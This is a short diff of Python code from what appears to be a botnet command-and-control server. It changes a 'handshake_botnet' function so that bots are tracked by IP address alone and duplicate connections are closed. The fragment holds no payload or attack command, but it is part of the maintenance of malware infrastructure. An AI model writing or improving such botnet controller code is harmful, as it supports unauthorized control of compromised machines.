@@ -69,12 +69,13 @@ def handshake_botnet(s, ip):
          c = 0
          if len(bots) > 0:
           for a in bots:
-           if ip != a[2]:c = 1; break
+           if ip[0] != a[2]:c = 1; break
            else:c = 0
          else:
            c = 1
          if c == 1:
-           bots.append([s,aes_list,ip])
+           bots.append([s,aes_list,ip[0]])
+         else:s.close()
     except Exception as e:print(e); pass
 
 def handle_title(s,ip):
